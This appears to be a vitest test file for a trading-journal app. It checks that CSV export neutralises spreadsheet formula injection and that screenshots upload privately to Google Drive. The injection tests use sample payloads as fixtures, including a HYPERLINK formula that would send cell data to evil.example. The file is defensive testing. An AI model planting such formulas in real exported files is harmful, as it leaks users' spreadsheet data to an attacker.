import { describe, expect, it, vi } from "vitest";
import { isFormulaLike, asPlainText } from "../src/lib/rows.js";
import { tradesToCsv, csvToRows, parseCsv } from "../src/lib/csv.js";
import { createDriveImages, isDriveRef } from "../src/lib/google.js";
import { normalizeTrade } from "../src/lib/rows.js";
import { generateDemoRows } from "../src/lib/demo.js";

describe("spreadsheet formula injection", () => {
  it("spots text a spreadsheet would run, leaves numbers and notes alone", () => {
    for (const v of ["=IMPORTXML(\"http://x\",\"//a\")", "+cmd", "@SUM(A1)", "-2+3", "=1", "\t=1"]) expect(isFormulaLike(v), v).toBe(true);
    for (const v of ["-12.50", "-3", "12.5", "", "-", "Moved stop", "1 : 2.00", "09:30", "2026-10-09", "a=b"]) expect(isFormulaLike(v), v).toBe(false);
    expect(asPlainText("=1+1")).toBe("'=1+1");
    expect(asPlainText("-45.10")).toBe("-45.10");
  });

  it("exported CSV can't run formulas in Excel, and imports back unchanged", () => {
    const evil = normalizeTrade({ ...generateDemoRows()[0], thesis: '=HYPERLINK("http://evil.example/?d="&A1,"x")', lesson: "+1", netPnl: "-12.50" });
    const csv = tradesToCsv([evil]);
    const cells = parseCsv(csv)[1];
    expect(cells.some(c => /^[=+@]/.test(c))).toBe(false);
    expect(cells).toContain("-12.5");
    expect(normalizeTrade(csvToRows(csv)[0])).toEqual(evil);
  });
});

describe("private screenshots in Google Drive", () => {
  const getToken = async () => "tok";

  it("uploads into the app's own folder and reads back with the token", async () => {
    const calls = [];
    const fetch = vi.fn(async (url, opts) => {
      calls.push(opts.method + " " + url.split("?")[0]);
      expect(opts.headers.Authorization).toBe("Bearer tok");
      const ok = body => ({ ok: true, status: 200, json: async () => body, blob: async () => new Blob(["png"]) });
      if (url.includes("/upload/")) {
        expect(opts.headers["Content-Type"]).toMatch(/^multipart\/related; boundary=/);
        const text = await opts.body.text();
        expect(text).toContain('"parents":["folder-1"]');
        return ok({ id: "img-9" });
      }
      if (url.includes("alt=media")) return ok(null);
      if (opts.method === "POST") return ok({ id: "folder-1" });
      return ok({ files: [] });
    });
    const d = createDriveImages({ getToken, fetch });
    const ref = await d.upload(new Blob(["png"], { type: "image/png" }));
    expect(ref).toBe("drive:img-9");
    expect(isDriveRef(ref)).toBe(true);
    await d.upload(new Blob(["png"], { type: "image/png" }));
    expect(calls.filter(c => c.startsWith("POST https://www.googleapis.com/drive/v3/files")).length).toBe(1); // folder made once
    const url = await d.objectUrl(ref);
    expect(url).toMatch(/^blob:/);
    expect(await d.objectUrl(ref)).toBe(url); // cached
    expect(calls.at(-1)).toBe("GET https://www.googleapis.com/drive/v3/files/img-9");
  });

  it("plain URLs are not treated as Drive files", () => {
    expect(isDriveRef("https://i.ibb.co/x.png")).toBe(false);
    expect(isDriveRef("drive:abc")).toBe(true);
  });
});
